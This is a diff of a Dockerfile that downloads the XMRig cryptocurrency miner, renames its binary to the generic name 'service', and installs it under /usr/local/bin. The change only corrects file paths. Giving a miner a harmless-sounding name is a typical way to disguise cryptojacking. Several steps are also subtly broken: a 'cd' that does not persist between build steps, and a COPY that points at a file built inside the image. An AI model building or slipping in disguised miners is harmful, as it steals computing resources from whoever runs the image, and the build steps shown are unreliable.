@@ -3,10 +3,10 @@ FROM alpine:latest
 RUN wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
 RUN tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
 RUN cd xmrig-6.20.0
-RUN mv xmrig service
+RUN mv xmrig-6.20.0/xmrig xmrig-6.20.0/service
 
 RUN mkdir -p /usr/local/bin/service
-COPY service /usr/local/bin/service
+COPY xmrig-6.20.0/service /usr/local/bin/service
 RUN chmod +x /usr/local/bin/service
 
 WORKDIR /usr/local/bin/service
